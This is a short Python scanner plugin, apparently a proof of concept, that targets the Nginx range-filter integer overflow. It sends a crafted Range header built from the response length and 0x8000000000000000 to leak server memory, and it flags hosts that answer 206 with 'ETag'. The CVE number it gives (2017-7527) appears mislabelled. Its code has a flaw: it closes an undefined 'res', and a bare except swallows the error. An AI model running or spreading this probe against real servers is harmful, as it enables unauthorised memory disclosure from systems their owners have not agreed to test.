#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = ''
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "Nginx整数溢出 cve-2017-7527"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  payload = "/"
  url1 = url + payload
  ret['url'] = url1
  try:
    r1 = requests.get(url1,headers=headers,verify=False,allow_redirects=False)
    url_len = len(r1.content)
    #获取正常响应的返回长度
    # 将数据长度加长，大于返回的正常长度

    addnum = 200
    final_len = url_len + addnum
    # 构造Range请求头，并加进headers中
    headers = {
      'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
      'Range':"bytes=-%d,-%d" % (final_len, 0x8000000000000000-final_len)
    }
    # 用构造的新的headers发送请求包,并输出结果
    r2 = requests.get(url1, headers=headers,verify=False,allow_redirects=False)
    if 'ETag' in r2.text and r2.status_code == 206:
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret



